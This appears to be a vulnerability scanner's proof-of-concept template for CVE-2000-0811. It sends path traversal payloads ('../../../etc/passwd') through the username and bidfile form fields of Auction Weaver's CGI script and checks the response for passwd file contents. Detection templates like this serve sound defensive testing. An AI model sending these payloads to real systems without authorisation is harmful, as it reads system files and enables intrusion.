[info]
author = "AVE"
description = "检测 Auction Weaver 1.0-1.04 路径遍历漏洞，通过 username 或 bidfile 表单字段注入 ../ 序列读取任意文件"
id = "POC-AVE-2000-0959"
name = "CVE-2000-0811 PoC"
severity = "medium"
tags = [
    "cve-2000-0811",
    "path-traversal",
    "lfi",
]
vuln_id = [
    "CVE-2000-0811",
    "AVE-2000-0959",
]

[poc]
logic = "any"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/cgi-bin/auctionweaver.cgi"
protocol = "http"

[poc.requests.body]
content = "username=../../../etc/passwd&bidfile="
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "root:",
    "bin:",
    "daemon:",
]

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/cgi-bin/auctionweaver.cgi"
protocol = "http"

[poc.requests.body]
content = "username=&bidfile=../../../etc/passwd"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "root:",
    "bin:",
    "daemon:",
]
